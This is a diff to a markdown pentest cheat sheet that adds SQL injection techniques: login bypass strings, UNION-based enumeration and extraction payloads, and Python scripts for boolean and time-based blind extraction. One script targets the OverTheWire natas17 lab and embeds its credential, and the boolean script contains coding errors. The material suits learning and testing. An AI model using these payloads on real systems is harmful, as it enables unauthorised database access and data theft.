@@ -91,6 +91,8 @@ SQL Injection Reading a File
 union all select 1,2,3,4,load_file("c:/windows/system32/drivers/etc/hosts"),6
 ```
 
+### Login Bypass
+
 SQL Logon Bypass Fuzzing Strings
 
 ```SQL
@@ -102,11 +104,146 @@ SQL Logon Bypass Fuzzing Strings
 ' or 1=1 -- -
 ```
 
-We can manually extract data from an SQL Injection using union/join.
+### Data Extraction
+
+If we can perform SQL Injection and are returned the outputs one table we can use, *UNION*, *JOIN*, or *statement chaining i.e: ;*
+
+The Union operator can only be used if the original/new queries have the same structure (number and data type of columns), we query this before extracting our data.
+
+We inject 'order by x' to determine the number of columns, it will error out once we exceed the number of rows in the initial query.
+
+```SQL
+' ORDER BY 1,2,..9 ---
+```
+
+Then we union select the appropriate number of columns. We exploit the fact that NULL is compatible with all datatypes. This won't work in oracle databases as every *SELECT* statement must include a *FROM* in which case we select from the globally accessible table *DUAL*
+
+```SQL
+' UNION SELECT NULL,NULL,NULL,NULL --
+```
+
+Then we try to find a column with a compatible data type, usually string/varchar.
+
+```SQL
+' UNION SELECT 'a',NULL,NULL,NULL --
+' UNION SELECT NULL,'a',NULL,NULL --
+' UNION SELECT NULL,NULL,'a',NULL --
+' UNION SELECT NULL,NULL,NULL,'a' --
+```
+
+Now we try to finger Database type + version.
+
+```
+MySQL: SELECT version()
+MS SQL: SELECT @@version
+PostgreSQL: SELECT version()
+Oracle: SELECT version FROM v$instance or SELECT FROM PRODUCT_COMPONENT_VERSION
+```
+
+```SQL
+' UNION SELECT @@version,NULL,NULL,NULL --
+```
+
+If we can't use the version strings we can try to work it out other ways, for example examining error messages or using a boolean query.
+
+```
+MySQL: CONCAT('a','b')
+MS SQL: 'a' + 'b'
+PostgreSQL: 'a' || 'b'
+Oracle: CONCAT('a','b') or 'a' || 'b'
+```
+
+In practice
+
+```SQL
+' 'AB' = CONCAT('a','b')
+```
+
+Next we need to determine the table names. We do this by querying either the *user_objects* table, which defines user created objects, the *all_user_objects* table which defines all the objects the user can see or the *information_schema.tables*/*all_tables*.
+
+```SQL
+' UNION SELECT object_name, object_type, NULL, NULL from user_objects --
+' UNION SELECT object_name, object_type, NULL, NULL from all_user_objects --
+' UNION SELECT table_name,NULL,NULL,NULL from information_schema.tables -- #MySQL, MS SQL, and PostgreSQL
+' UNION SELECT table_name,NULL,NULL,NULL from all_tables -- #ORACLE
+```
+
+Next we need to determine the column names. We do this by querying the *user_tab_columns* table or the *information_schema.columns*
+
+```SQL
+' UNION SELECT column_name, NULL, NULL, NULL FROM user_tab_columns WHERE table_name = 'USERS' --
+' UNION SELECT column_name, NULL, NULL, NULL FROM user_tab_columns WHERE table_name = 'USERS' --
+```
+
+Once we have the column and table names we can extract the desired data.
+
+```SQL
+' UNION SELECT names, NULL, NULL, NULL FROM 'USERS' --
+```
 
 
+### Boolean Based
 
----
+If in an injectable application returns a different response depending on whether a query returns TRUE or FALSE then we can use that response to determine values in the database.
+
+Assume an injectable URL
+
+https://exampleurl.com/login.php?id=1'
+If 
+https://exampleurl.com/login.php?id=1' AND 1=0
+Is different to
+https://exampleurl.com/login.php?id=1' AND 1=1
+Then we can essentially brute force databases values out one character at a time using queries like SUBSTRING, strcmp, LIKE BINARY, etc
+https://exampleurl.com/login.php?id=1' AND ASCII(SUBSTRING(username,1,1)) = 97 AND '1' = '1'
+
+We would write a script like
+
+```
+import requests
+
+url = 'https://exampleurl.com/login.php?id=1''
+alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+name = ''
+
+for i in range(0,32):
+    for char in alphas:
+        sql = "' AND ASCII(SUBSTRING(username," + i + ",1)) = " + name + char + " AND '1' = '1' --"
+        r= requests.post(url + sql)
+        if 'exists' in r.text:
+            passwd += char
+            print(passwd)
+            break
+```
+
+Assuming a 32 length max username, could be refined to check length + for null character so no need for hardcoded max, to filter for characters in string before determining their place to speed up, etc.
+
+### Time Based
+
+Time-based SQL Injection is an inferential SQL Injection technique that relies on sending an SQL query to the database which forces the database to wait for a specified amount of time before responding. The response time will indicate to the attacker whether the result of the query is TRUE or FALSE. Again it only returns boolean values so we would script like
+
+```python
+import requests
+
+user = 'natas17'
+password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
+url = 'http://natas17.natas.labs.overthewire.org/index.php'
+alphas  = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+passwd = ''
+
+for i in range(0,32):
+    for char in alphas:
+        sql = {'username' : 'natas17" and password LIKE BINARY "' + passwd + char  + '%" and sleep(5) -- '}
+        r= requests.post(url, auth=(user, password), data=sql)
+        if (r.elapsed.seconds >= 10):
+            passwd += char
+            print(passwd)
+            break
+```
+
+### Out of Band 
+
+Out-of-band SQL Injection occurs when an attacker is unable to use the same channel to launch the attack and gather results, instead they use an out of band channel, often a ping, DNS or HTTP request depending on whether a query is true or false.
+
 
 ## Cross Site Scripting XSS
 
